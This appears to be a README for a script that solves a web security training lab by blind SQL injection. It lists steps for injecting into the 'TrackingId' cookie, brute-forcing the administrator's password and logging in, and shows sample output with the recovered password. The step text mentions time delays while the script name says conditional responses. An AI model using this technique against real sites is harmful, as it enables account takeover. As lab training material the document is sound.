# Hack Steps

1. Inject payload into 'TrackingId' cookie to determine the length of administrator's password based on time delays
2. Modify the payload to brute force the administrator's password 
3. Fetch the login page
4. Extract csrf token and session cookie
5. Login as the administrator
6. Fetch the administrator profile

# Run Script

1. Change the URL of the lab
2. Start script

```
~$ python blind_sql_injection_with_conditional_responses.py
```

# Expected Output

```
[#] Injection point: TrackingId
1. Checking if password length = 10 
1. Checking if password length = 15
                    .........
1. Checking if password length = 20 [ Correct length: 20 ]
2. Checking if char at position 5   =  9 [ Correct password: 37z59 ]
2. Checking if char at position 12  =  i [ Correct password: 37z59ib4bm7i ]
                    ..........
2. Checking if char at position 20  =  2 [ Correct password: 37z59ib4bm7ifm6fuxo2 ]
3. Fetching login page.. OK
4. Extracting csrf token and session cookie.. OK
5. Logging in as the administrator.. OK
6. Fetching the administrator profile.. OK
[#] Check your browser, it should be marked now as solved
```
